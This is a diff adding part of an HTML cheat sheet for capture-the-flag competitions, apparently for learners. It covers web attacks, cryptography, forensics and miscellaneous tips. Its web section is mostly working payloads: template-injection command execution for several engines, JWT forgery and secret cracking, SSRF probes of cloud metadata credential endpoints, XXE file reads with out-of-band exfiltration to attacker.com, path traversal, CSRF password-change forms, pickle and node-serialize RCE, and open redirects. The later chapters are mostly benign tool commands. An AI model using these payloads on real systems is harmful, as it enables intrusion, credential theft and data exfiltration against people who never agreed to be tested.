+{% for c in ''.__class__.__mro__[1].__subclasses__() %}
+  {% if c.__name__ == 'Popen' %}{{loop.index0}}{% endif %}
+{% endfor %}</pre>
+    </div>
+
+    <div class="subsection">
+      <div class="subsection-title">Other Engines</div>
+      <pre>
+<span class="cm"># Twig (PHP)</span>
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{["id"]|filter("system")}}
+
+<span class="cm"># Freemarker (Java)</span>
+${"freemarker.template.utility.Execute"?new()("id")}
+
+<span class="cm"># Velocity (Java)</span>
+#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))
+#set($chr=$x.class.forName("java.lang.Character"))
+#set($str=$x.class.forName("java.lang.String"))
+#set($ex=$rt.getRuntime().exec("id"))
+
+<span class="cm"># ERB (Ruby)</span>
+<%= `id` %>
+<%= system("id") %></pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-jwt">
+    <div class="section-title">🔑 JWT Attacks</div>
+
+    <div class="subsection">
+      <div class="subsection-title">JWT Structure & Decoding</div>
+      <pre>
+<span class="cm"># JWT = base64url(header).base64url(payload).signature</span>
+<span class="cm"># Decode manually</span>
+echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
+<span class="cm"># or use jwt.io</span>
+
+<span class="cm"># Python: decode without verification</span>
+import jwt
+data = jwt.decode(token, options={"verify_signature": False})
+print(data)</pre>
+    </div>
+
+    <div class="subsection">
+      <div class="subsection-title">JWT Attack Techniques</div>
+      <div class="payload-block">
+        <div class="label">Attack 1: None Algorithm</div>
+Change "alg": "HS256" → "alg": "none"<br>Remove signature entirely (keep trailing dot)<br>eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
+      </div>
+      <div class="payload-block">
+        <div class="label">Attack 2: HS256 with weak secret</div>
+hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt<br>john --wordlist=rockyou.txt --format=HMAC-SHA256 jwt.txt
+      </div>
+      <div class="payload-block">
+        <div class="label">Attack 3: RS256 → HS256 (key confusion)</div>
+# If server uses RS256, try signing with HS256 using the public key as secret<br>python3 jwt_tool.py TOKEN -X k -pk public.pem
+      </div>
+      <pre>
+<span class="cm"># jwt_tool — Swiss army knife for JWT</span>
+python3 jwt_tool.py TOKEN --crack -d wordlist.txt   # Crack secret
+python3 jwt_tool.py TOKEN -T                        # Tamper mode
+python3 jwt_tool.py TOKEN -X a                      # alg:none attack
+python3 jwt_tool.py TOKEN -I -pc role -pv admin -S hs256 -p secret  # Forge
+
+<span class="cm"># Forge JWT in Python</span>
+import jwt
+payload = {"user": "admin", "role": "superuser"}
+token = jwt.encode(payload, "secret", algorithm="HS256")
+print(token)</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-ssrf">
+    <div class="section-title">🔄 SSRF (Server-Side Request Forgery)</div>
+
+    <div class="subsection">
+      <div class="subsection-title">SSRF Payloads</div>
+      <div class="payload-block">
+        <div class="label">Internal Service Probe</div>
+http://localhost/admin<br>http://127.0.0.1/flag<br>http://0.0.0.0/etc/passwd<br>http://[::1]/admin<br>http://169.254.169.254/latest/meta-data/  (AWS metadata)<br>http://metadata.google.internal/computeMetadata/v1/  (GCP)<br>http://169.254.169.254/metadata/instance  (Azure)
+      </div>
+      <div class="payload-block">
+        <div class="label">Bypass Filters</div>
+http://127.1/admin<br>http://0177.0.0.1/  (octal)<br>http://2130706433/  (decimal IP for 127.0.0.1)<br>http://127.0.0.1.nip.io/admin<br>http://localtest.me/admin<br>http://whitelisted.com@127.0.0.1/admin<br>http://127.0.0.1#whitelisted.com
+      </div>
+      <pre>
+<span class="cm"># Protocol tricks</span>
+file:///etc/passwd
+dict://127.0.0.1:6379/INFO      # Redis
+gopher://127.0.0.1:6379/_INFO    # Redis via gopher
+ftp://127.0.0.1/flag.txt
+
+<span class="cm"># Cloud metadata endpoints</span>
+# AWS
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+# GCP
+http://metadata.google.internal/computeMetadata/v1/instance/  # Requires: -H "Metadata-Flavor: Google"</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-xxe">
+    <div class="section-title">📄 XXE Injection</div>
+
+    <div class="subsection">
+      <div class="subsection-title">XXE Payloads</div>
+      <pre>
+<span class="cm"># Basic XXE (read /etc/passwd)</span>
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE foo [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;root&gt;&lt;data&gt;&amp;xxe;&lt;/data&gt;&lt;/root&gt;
+
+<span class="cm"># XXE to SSRF</span>
+&lt;!ENTITY xxe SYSTEM "http://internal.server/"&gt;
+
+<span class="cm"># Blind XXE (out-of-band)</span>
+&lt;!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"&gt;
+&lt;!-- evil.dtd content: --&gt;
+&lt;!ENTITY % data SYSTEM "file:///etc/passwd"&gt;
+&lt;!ENTITY % param1 "&lt;!ENTITY exfil SYSTEM 'http://attacker.com/?data=%data;'&gt;"&gt;
+%param1;
+
+<span class="cm"># XInclude (when you can't control DOCTYPE)</span>
+&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+  &lt;xi:include parse="text" href="file:///etc/passwd"/&gt;
+&lt;/foo&gt;</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-idor">
+    <div class="section-title">🆔 IDOR & Access Control</div>
+
+    <div class="subsection">
+      <div class="subsection-title">Common IDOR Patterns</div>
+      <pre>
+<span class="cm"># Change numeric IDs in URL/params</span>
+/user/profile?id=123   →   /user/profile?id=1
+/api/orders/456        →   /api/orders/1
+/download?file=myfile.pdf  →  /download?file=../../flag.txt
+
+<span class="cm"># Change own user ID to admin user ID</span>
+{"user_id": 1234}      →   {"user_id": 1}
+
+<span class="cm"># Mass Assignment (add admin field)</span>
+{"username":"user","password":"pass","role":"admin"}
+
+<span class="cm"># HTTP method override</span>
+X-HTTP-Method-Override: DELETE
+X-Method-Override: PUT
+
+<span class="cm"># Common privileged endpoints to test</span>
+/admin
+/api/admin/users
+/dashboard/admin
+/internal/
+/management/</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-dir">
+    <div class="section-title">📁 Directory Traversal</div>
+
+    <div class="subsection">
+      <div class="subsection-title">Traversal Payloads</div>
+      <div class="payload-block">
+        <div class="label">Path Traversal Variants</div>
+../../../etc/passwd<br>....//....//....//etc/passwd<br>..%2F..%2F..%2Fetc%2Fpasswd<br>%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd<br>..%252F..%252F..%252Fetc%252Fpasswd  (double URL encode)<br>..%c0%af..%c0%afetc%c0%afpasswd (overlong UTF-8)<br>....\/....\/etc/passwd (Windows)<br>..\..\..\windows\win.ini (Windows)
+      </div>
+    </div>
+  </div>
+
+  <div class="section" id="section-csrf">
+    <div class="section-title">🎣 CSRF (Cross-Site Request Forgery)</div>
+    <div class="subsection">
+      <div class="subsection-title">CSRF Payloads</div>
+      <pre>
+<span class="cm"># Simple auto-submitting form</span>
+&lt;form id="f" action="http://target.com/api/change-password" method="POST"&gt;
+  &lt;input type="hidden" name="new_pass" value="hacked"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;
+
+<span class="cm"># Using fetch for JSON CSRF (if CORS allows)</span>
+&lt;script&gt;
+fetch('http://target.com/api/profile', {
+  method: 'POST',
+  body: JSON.stringify({email: 'attacker@evil.com'}),
+  headers: {'Content-Type': 'application/json'}
+});
+&lt;/script&gt;</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-deserial">
+    <div class="section-title">🧬 Deserialization</div>
+    <div class="subsection">
+      <div class="subsection-title">Quick Reference</div>
+      <pre>
+<span class="cm"># PHP Serialization</span>
+O:4:"User":2:{s:8:"username";s:5:"admin";s:5:"admin";b:1;}
+
+<span class="cm"># Python Pickle RCE</span>
+import pickle, base64, os
+class Evil:
+    def __reduce__(self):
+        return (os.system, ('id',))
+print(base64.b64encode(pickle.dumps(Evil())))
+
+<span class="cm"># Node.js node-serialize RCE</span>
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id',...)}()"}</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-redirect">
+    <div class="section-title">↪️ Open Redirect</div>
+    <div class="subsection">
+      <div class="subsection-title">Redirect Payloads</div>
+      <pre>
+?next=http://attacker.com
+?url=//attacker.com
+?redirect_uri=https://attacker.com
+?next=/\attacker.com
+?next=https:attacker.com</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-headers">
+    <div class="section-title">🌐 HTTP Header Tricks</div>
+    <div class="subsection">
+      <div class="subsection-title">Headers to Fuzz/Inject</div>
+      <pre>
+X-Forwarded-For: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Forwarded-Host: localhost
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+User-Agent: (inject XSS/SQLi/SSTI here)
+Referer: (inject payloads here)
+Cookie: (check for base64/JSON/serialization)</pre>
+    </div>
+  </div>
+</div>
+
+<div class="chapter" id="chapter-crypto">
+  <div class="chapter-header chapter-crypto">
+    <span class="chapter-icon">🔐</span>
+    <div>
+      <div class="chapter-title" style="color:var(--purple)">CRYPTOGRAPHY</div>
+      <div class="chapter-desc">Encoding · Classical Ciphers · XOR · RSA · AES · Hash Cracking · CyberChef</div>
+    </div>
+  </div>
+
+  <div class="section" id="section-enc-enc">
+    <div class="section-title">🔑 Encoding vs Encryption</div>
+    <div class="subsection">
+      <div class="subsection-title">Base64 / Hex / Binary</div>
+      <pre>
+<span class="cm"># Base64 Encode/Decode</span>
+echo -n "flag{...}" | base64
+echo "ZmxhZ3suLi59" | base64 -d
+
+<span class="cm"># Hex Encode/Decode</span>
+echo -n "flag" | xxd -p
+echo "666c6167" | xxd -p -r
+
+<span class="cm"># Binary to Text</span>
+# 01100001 ... use CyberChef or Python</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-classical">
+    <div class="section-title">📜 Classical Ciphers</div>
+    <div class="subsection">
+      <div class="subsection-title">Caesar / ROT13 / Vigenère</div>
+      <pre>
+<span class="cm"># ROT13 in Linux</span>
+echo "synt{...}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+
+<span class="cm"># Vigenère Cipher</span>
+# Needs a key. Use dcode.fr or CyberChef "Vigenère Decode" tool.</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-xor">
+    <div class="section-title">⊕ XOR Cipher</div>
+    <div class="subsection">
+      <div class="subsection-title">XOR Basics</div>
+      <pre>
+<span class="cm"># If A ^ B = C, then A ^ C = B</span>
+<span class="cm"># Use CyberChef "XOR" or "XOR Brute Force"</span></pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-rsa">
+    <div class="section-title">📐 RSA Attacks</div>
+    <div class="subsection">
+      <div class="subsection-title">Common RSA Weaknesses</div>
+      <pre>
+<span class="cm"># Small e (e=3)</span>
+# Use cube root attack.
+
+<span class="cm"># Factoring N</span>
+# Use factordb.com to see if N is already factored into p and q.
+
+<span class="cm"># RsaCtfTool</span>
+python3 RsaCtfTool.py --publickey ./key.pub --uncipherfile ./cipher.txt</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-aes">
+    <div class="section-title">⛓️ AES/Block Cipher Attacks</div>
+    <div class="subsection">
+      <div class="subsection-title">ECB vs CBC</div>
+      <pre>
+<span class="cm"># ECB (Electronic Codebook)</span>
+# Identical blocks = identical ciphertext. Look for patterns in images.
+
+<span class="cm"># Padding Oracle Attack</span>
+# Use padbuster or custom scripts if the server gives padding errors.</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-hash">
+    <div class="section-title">#️⃣ Hash Cracking</div>
+    <div class="subsection">
+      <div class="subsection-title">Hashcat & John the Ripper</div>
+      <pre>
+<span class="cm"># Identify hash type</span>
+hashid "hash_here"
+
+<span class="cm"># Hashcat (MD5=0, SHA1=100, SHA256=1400)</span>
+hashcat -m 0 hash.txt rockyou.txt
+
+<span class="cm"># John the Ripper</span>
+john --wordlist=rockyou.txt hash.txt</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-base">
+    <div class="section-title">🔡 Base Encoding Family</div>
+    <div class="subsection">
+      <div class="subsection-title">Base32 / Base58 / Base85</div>
+      <pre>
+# Base32: A-Z, 2-7. Ends with =
+# Base58: Bitcoin alphabet (no 0, O, I, l)
+# Base85/Ascii85: Includes characters like <, >, ?, etc.</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-freq">
+    <div class="section-title">📊 Frequency Analysis</div>
+    <div class="subsection">
+      <div class="subsection-title">Substitution Ciphers</div>
+      <pre>
+# Use quipqiup.com for fast solving of substitution ciphers.</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-vigenere">
+    <div class="section-title">🔑 Vigenère Cipher</div>
+    <div class="subsection">
+      <div class="subsection-title">Polyalphabetic Substitution</div>
+      <pre>
+# Use CyberChef "Vigenère Decode" or dcode.fr.</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-py-crypto">
+    <div class="section-title">🐍 Python Crypto Toolkit</div>
+    <div class="subsection">
+      <div class="subsection-title">PyCryptodome Snippet</div>
+      <pre>
+from Crypto.Util.number import long_to_bytes, bytes_to_long
+# Convert large numbers to text flags</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-cyberchef">
+    <div class="section-title">👨‍🍳 CyberChef Recipes</div>
+    <div class="subsection">
+      <div class="subsection-title">Useful Operations</div>
+      <pre>
+- From Base64 / To Base64
+- Magic (very useful for unknown encoding)
+- From Hex / To Hex
+- XOR / Bitwise operations</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-crypto-patterns">
+    <div class="section-title">🎯 Common CTF Crypto Patterns</div>
+    <div class="subsection">
+      <div class="subsection-title">Patterns to Watch For</div>
+      <pre>
+- Flag headers (CTF{...) encoded as Hex/Base64
+- RSA public keys provided as .pem files
+- Large numbers (n, e, c) in challenge descriptions</pre>
+    </div>
+  </div>
+</div>
+
+<div class="chapter" id="chapter-forensics">
+  <div class="chapter-header chapter-forensics">
+    <span class="chapter-icon">🔍</span>
+    <div>
+      <div class="chapter-title" style="color:var(--cyan)">FORENSICS</div>
+      <div class="chapter-desc">File Analysis · Steganography · PCAP · Memory · Disk · Metadata · Archives</div>
+    </div>
+  </div>
+
+  <div class="section" id="section-file-basics">
+    <div class="section-title">📄 File Analysis Basics</div>
+    <div class="subsection">
+      <div class="subsection-title">Essential Tools</div>
+      <pre>
+<span class="cm"># Identify file type (even with wrong extension)</span>
+file image.png
+
+<span class="cm"># Extract readable strings</span>
+strings image.png | grep -i "flag"
+
+<span class="cm"># View hex data</span>
+xxd image.png | head</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-stego">
+    <div class="section-title">🧩 Steganography</div>
+    <div class="subsection">
+      <div class="subsection-title">Hiding Data in Files</div>
+      <pre>
+<span class="cm"># Steghide (extract from JPG/BMP/WAV/AU)</span>
+steghide extract -sf image.jpg
+
+<span class="cm"># Stegsolve (GUI tool for viewing bit planes)</span>
+java -jar stegsolve.jar</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-img-forensics">
+    <div class="section-title">🖼️ Image Forensics</div>
+    <div class="subsection">
+      <div class="subsection-title">Images Analysis</div>
+      <pre>
+<span class="cm"># Binwalk (extract hidden files)</span>
+binwalk -e image.png
+
+<span class="cm"># Exiftool (view metadata)</span>
+exiftool image.png</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-audio">
+    <div class="section-title">🎵 Audio Steganography</div>
+    <div class="subsection">
+      <div class="subsection-title">Sound Analysis</div>
+      <pre>
+<span class="cm"># Spectrogram (Use Audacity)</span>
+# Look for hidden text in the "Spectrogram" view.</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-pcap">
+    <div class="section-title">📡 PCAP / Network Analysis</div>
+    <div class="subsection">
+      <div class="subsection-title">Wireshark & Tshark</div>
+      <pre>
+# Open file in Wireshark. 
+# Right click -> Follow -> TCP Stream.</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-disk">
+    <div class="section-title">💾 Disk & Memory Forensics</div>
+    <div class="subsection">
+      <div class="subsection-title">Volatility</div>
+      <pre>
+<span class="cm"># Memory analysis</span>
+volatility -f mem.raw imageinfo</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-metadata">
+    <div class="section-title">📝 Metadata Extraction</div>
+    <div class="subsection">
+      <div class="subsection-title">Exiftool Reference</div>
+      <pre>
+exiftool file.pdf</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-archive">
+    <div class="section-title">📦 Archive & Compressed Files</div>
+    <div class="subsection">
+      <div class="subsection-title">Zip/Tar Analysis</div>
+      <pre>
+<span class="cm"># Cracking Zip password</span>
+fcrackzip -u -D -p rockyou.txt secret.zip</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-pdf">
+    <div class="section-title">📑 PDF/Office Forensics</div>
+    <div class="subsection">
+      <div class="subsection-title">PDF Tools</div>
+      <pre>
+pdfid file.pdf
+pdf-parser file.pdf</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-logs">
+    <div class="section-title">📊 Log Analysis</div>
+    <div class="subsection">
+      <div class="subsection-title">Examining Logs</div>
+      <pre>
+cat access.log | grep "flag"</pre>
+    </div>
+  </div>
+</div>
+
+<div class="chapter" id="chapter-misc">
+  <div class="chapter-header chapter-misc">
+    <span class="chapter-icon">⚡</span>
+    <div>
+      <div class="chapter-title" style="color:var(--orange)">MISCELLANEOUS</div>
+      <div class="chapter-desc">Linux · Python Scripts · Reverse Engineering · Binary Bases · OSINT · Strategy</div>
+    </div>
+  </div>
+
+  <div class="section" id="section-linux">
+    <div class="section-title">🐧 Linux Essentials</div>
+    <div class="subsection">
+      <div class="subsection-title">One-liners</div>
+      <pre>
+grep -r "flag" .
+find / -name flag.txt 2>/dev/null</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-py-scripts">
+    <div class="section-title">🐍 Python Quick Scripts</div>
+    <div class="subsection">
+      <div class="subsection-title">Networking</div>
+      <pre>
+# Use socket or requests library</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-rev">
+    <div class="section-title">⚙️ Reverse Engineering Basics</div>
+    <div class="subsection">
+      <div class="subsection-title">Intro Tools</div>
+      <pre>
+objdump -d binary
+gdb ./binary</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-bases">
+    <div class="section-title">🔢 Binary / Number Bases</div>
+    <div class="subsection">
+      <div class="subsection-title">Conversions</div>
+      <pre>
+# Hex to Dec, Bin to Hex, etc.</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-regex">
+    <div class="section-title">🔍 Regex Tricks</div>
+    <div class="subsection">
+      <div class="subsection-title">Common Patterns</div>
+      <pre>
+flag\{.*?\}</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-git">
+    <div class="section-title">🪵 Git Forensics</div>
+    <div class="subsection">
+      <div class="subsection-title">Exploring History</div>
+      <pre>
+git log
+git checkout HEAD^</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-docker">
+    <div class="section-title">🐳 Docker CTF Tips</div>
+    <div class="subsection">
+      <div class="subsection-title">Docker Basics</div>
+      <pre>
+docker ps
+docker exec -it ID /bin/bash</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-osint">
+    <div class="section-title">🕵️ OSINT Techniques</div>
+    <div class="subsection">
+      <div class="subsection-title">Searching</div>
+      <pre>
+Google Dorking: site:target.com "password"</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-strategy">
+    <div class="section-title">🏁 General CTF Strategy</div>
+    <div class="subsection">
+      <div class="subsection-title">Tips</div>
+      <pre>
+Read carefully. Check hints. Try simple things first.</pre>
+    </div>
+  </div>
+
+  <div class="section" id="section-online-tools">
+    <div class="section-title">🔗 Online Tools Reference</div>
+    <div class="subsection">
+      <div class="subsection-title">Quick Links</div>
+      <pre>
+CyberChef, factordb.com, quipqiup.com, dcode.fr</pre>
+    </div>
+  </div>
+</div>
+
+<div class="divider"></div>
+
+<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px;">
+    <div>
+      <div style="color: var(--cyan); font-weight:700; font-size:12px; text-transform:uppercase; margin-bottom:8px;">Web Quick Check</div>
+      <pre style="font-size:11px; padding:10px;">robots.txt
+Ctrl+U (source)
+curl -I (headers)
+' in all inputs
+admin:admin login</pre>
+    </div>
+    <div>
+      <div style="color: var(--orange); font-weight:700; font-size:12px; text-transform:uppercase; margin-bottom:8px;">Crack Hash</div>
+      <pre style="font-size:11px; padding:10px;">crackstation.net
+hashcat -m 0 h rockyou
+john --wordlist=... h
+hash-identifier HASH</pre>
+    </div>
+    <div>
+      <div style="color: var(--red); font-weight:700; font-size:12px; text-transform:uppercase; margin-bottom:8px;">SQLi Quick</div>
+      <pre style="font-size:11px; padding:10px;">' OR 1=1--
+admin'--
+sqlmap -u URL --batch
+' UNION SELECT NULL--</pre>
+    </div>
+    <div>
+      <div style="color: var(--pink); font-weight:700; font-size:12px; text-transform:uppercase; margin-bottom:8px;">RSA Quick</div>
+      <pre style="font-size:11px; padding:10px;">factordb.com
+RsaCtfTool.py</pre>
+    </div>
+</div>
+
+</div>
+</body>
+</html>
